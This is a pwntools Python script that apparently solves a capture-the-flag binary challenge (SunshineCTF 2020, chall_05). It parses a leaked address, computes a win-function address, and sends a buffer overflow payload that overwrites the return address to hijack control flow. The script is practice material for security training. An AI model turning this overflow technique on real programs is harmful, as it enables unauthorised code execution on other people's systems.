#!/usr/bin/env python3

from pwn import *
import re

context.binary = ELF('./chall_05')

if args.REMOTE:
    io = remote('chal.2020.sunshinectf.org', 30005)
else:
    io = process(context.binary.path)    

print(io.recvline())
buffer = 'A' * 56

io.sendline('throwaway')
response = str(io.recvline()) # 'b"Yes I\'m going to win: 0x000xyz\\n"'

main_address = re.search("0x[0-9a-f]+", response).group()
offset = 0x13
win_address = int(main_address, 16) - offset
payload = p64(win_address)
exploit = flat(buffer, payload)

print("Sending: ", exploit)
io.sendline(exploit)
io.interactive()
